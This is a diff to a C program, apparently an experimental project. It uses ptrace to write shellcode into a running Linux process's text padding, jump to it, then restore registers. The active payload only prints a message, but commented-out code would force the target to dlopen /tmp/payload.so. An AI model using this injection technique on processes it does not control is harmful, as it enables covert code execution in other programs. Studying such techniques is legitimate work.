@@ -18,10 +18,14 @@
 #include <sys/errno.h>
 #include <dlfcn.h>
 
+/* the offset of int3 in shellcode */
+#define INT3_PATCH_OFFSET 4
+
 typedef struct _handle_t
 {
     /* pid of target process */
     pid_t       pid;
+    struct user_regs_struct pt_reg;
 
     /* content of libc of target process */
     uint64_t    libc_base_addr;
@@ -34,6 +38,7 @@ typedef struct _handle_t
 
     /* some symbol information */
     uint64_t    dlopen_addr;
+    uint64_t    dlerror_addr;
     uint64_t    dlsym_addr;
 
     /* content of target process */
@@ -47,27 +52,41 @@ typedef struct _handle_t
 }handle_t;
 
 int dump_process(handle_t *);
-void injected_code(uint64_t);
+void injected_code(uint64_t/*, uint64_t*/);
 int dump_libc(handle_t *);
 int pid_read(pid_t, const void *, const void *, size_t);
 int pid_write(pid_t, const void *, const void *, size_t);
-uint64_t look_up_symbol(handle_t, const char *);
+uint64_t look_up_libcsymbol(handle_t, const char *);
 
-static inline volatile void 
-call_dlopen(char *, int, uint64_t)__attribute__((aligned(8), __always_inline__));
-
-static inline volatile void
-call_dlopen(char *library_addr, int flag, uint64_t dlopen_addr)
-{   
+void injected_code(uint64_t dlopen_addr /*,uint64_t int3_addr*/)
+{ 
+    char library_name[] = {'/', 't', 'm', 'p', '/', 'p', 'a', 'y', 'l', 'o', 'a', 'd', '.', 's', 'o', '\0'}; 
+    uint64_t int3_addr = 0x401281;
+    int flags = 2;
+    int fd = 1;
+    char str[] = {'[', 'I', '\'', 'm', ' ', 'i', 'n', ' ', 'h', 'e', 'r', 'e', ']','\n', '\0'};
+    long len = 15;
+    /*
     __asm__ volatile(
         "mov %0, %%rdi\n"
         "mov %1, %%esi\n"
-        "mov %2, %%rax\n"
-        "jmp *%%rax\n"
-        "int3"
-        : 
-        : "g"(library_addr), "g"(flag), "g"(dlopen_addr)
+        "push %2\n"
+        "jmp *%3\n"
+        :
+        : "g"(library_name), "g"(flags), "g"(int3_addr), "g"(dlopen_addr)
     );
+    */
+    __asm__ volatile(
+        "mov %0, %%edi\n"
+        "mov %1, %%rsi\n"
+        "mov %2, %%rdx\n"
+        "mov $1, %%rax\n"
+        "syscall\n"
+        "int3\n"
+        : 
+        : "g"(fd), "g"(str), "g"(len)
+    );
+    
 }
 
 int dump_process(handle_t *h)
@@ -144,16 +163,6 @@ int dump_process(handle_t *h)
     if(pid_read(h->pid, h->got, (void *)h->got_addr, got_size) < 0)
         return -1;
     return 0;
-}
-
-void injected_code(uint64_t dlopen_addr)
-{
-    char library_name[] = {'\\', 't', 'm', 'p', '\\', 'p', 'a', 'y', 'l', 'o', 'a', 'd', '.', 's', 'o'}; 
-    char func_name[] = {'_', 's', 't', 'a', 'r', 't'};
-
-    long flag = RTLD_NOW;
-
-    call_dlopen(library_name, flag, dlopen_addr);
 }
 
 int dump_libc(handle_t *h)
@@ -291,7 +300,19 @@ int pid_write(pid_t pid, const void *dst, const void *src, size_t len)
     return 0;
 }
 
-uint64_t look_up_symbol(handle_t h, const char *symbol)
+unsigned long f1 = (uint64_t)injected_code;
+unsigned long f2 = (uint64_t)dump_process;
+
+uint8_t *create_shellcode(void (*fn)(), size_t len)
+{
+    int i;
+    uint8_t *shellcode = (uint8_t *)malloc(len);
+    uint8_t *ptr = (uint8_t *)fn;
+    for(i = 0; i < len; i++) *(shellcode + i) = *(ptr + i);
+    return shellcode;
+}
+
+uint64_t look_up_libcsymbol(handle_t h, const char *symbol)
 {
     int i;
     uint64_t result = 0;
@@ -341,22 +362,99 @@ int main(int argc, char *argv[])
     }
 
     printf("Then, remote resolve the dynamic symbol...\n");
-    if((h.dlopen_addr = look_up_symbol(h, "dlopen")) == 0)
+    if((h.dlopen_addr = look_up_libcsymbol(h, "dlopen")) == 0)
     {
         printf("something went wrong with dlopen resolution.\n");
         exit(-1);
     }
-    if((h.dlsym_addr = look_up_symbol(h, "dlsym")) == 0)
-    {
-        printf("something went wrong with dlsym resolution.\n");
-        exit(-1);
-    }
-    /*
-    if((h.dlsym_addr = look_up_symbol(h, "dlerror")) == 0)
+    if((h.dlsym_addr = look_up_libcsymbol(h, "perror")) == 0)
     {
         printf("something went wrong with dlerror resolution.\n");
         exit(-1);
     }
-    */
+    size_t shell_size = f2 - f1;
+    uint8_t *shellcode = create_shellcode(injected_code, shell_size);
+    uint64_t inject_addr;
+    int i;
+    for(i = 0; i < h.ehdr->e_phnum; i++)
+    {
+        if(h.phdr[i].p_type == PT_LOAD && (h.phdr[i].p_flags == (PF_R | PF_X)))
+        {
+            inject_addr = h.phdr[i].p_vaddr + h.phdr[i].p_memsz;
+            break;
+        }
+    }
+    
+    printf("Going to inject shellcode to the text padding area...\n");
+    printf("\t[+] inject to 0x%lx\n", inject_addr);
+    uint64_t int3_addr = inject_addr + shell_size - INT3_PATCH_OFFSET;
+    
+    printf("\t[+] address of int3 is: 0x%lx\n", int3_addr);
+    if(ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0)
+    {
+        fprintf(stderr, "Failed to get the registers of target process %d: %s\n", h.pid, strerror(errno));
+        exit(EXIT_FAILURE);
+    }
+    uint64_t old_rip = h.pt_reg.rip;
+    uint64_t old_rsp = h.pt_reg.rsp;
+    uint64_t old_rbp = h.pt_reg.rbp;
+
+    if(pid_write(h.pid, (void *)inject_addr, shellcode, shell_size) == 1)
+    {
+        printf("Failed to write shellcode\n");
+        exit(EXIT_FAILURE);
+    }
+
+    h.pt_reg.rip = inject_addr;
+    h.pt_reg.rdi = h.dlopen_addr;
+    // h.pt_reg.rsi = int3_addr;
+    // h.pt_reg.rdx = h.dlerror_addr;
+
+    if(ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0)
+    {
+        fprintf(stderr, "Failed to set the registers of target process %d: %s\n", h.pid, strerror(errno));
+        exit(EXIT_FAILURE);
+    }
+    if(ptrace(PTRACE_CONT, h.pid, NULL, NULL) < 0)
+    {
+        fprintf(stderr, "Failed to restart the target process %d: %s\n", h.pid, strerror(errno));
+        exit(EXIT_FAILURE);
+    }
+
+    wait(&status);
+    if(WSTOPSIG(status) != SIGTRAP)
+    {
+        printf("Something went wrong.\n");
+        // exit(EXIT_FAILURE);
+    }else
+    {
+        printf("Shellcode has been injected and executed.\n");
+        
+    }
+    printf("Press any key to continue...\n");
+    getchar();
+    // Recovery the context of target process
+    if(ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0)
+    {
+        perror("PTRACE_GETREGS");
+        exit(EXIT_FAILURE);
+    }
+    h.pt_reg.rip = old_rip;
+    h.pt_reg.rsp = old_rsp;
+    h.pt_reg.rbp = old_rbp;
+
+    if(ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0)
+    {
+        perror("PTRACE_SETREGS");
+        exit(EXIT_FAILURE);
+    }
+
+    // Detaching to make the target process run
+    if(ptrace(PTRACE_DETACH, h.pid, NULL, NULL) < 0)
+    {
+        perror("PTRACE_CONT");
+        exit(EXIT_FAILURE);
+    }
+    wait(NULL);
     return 0;
 }
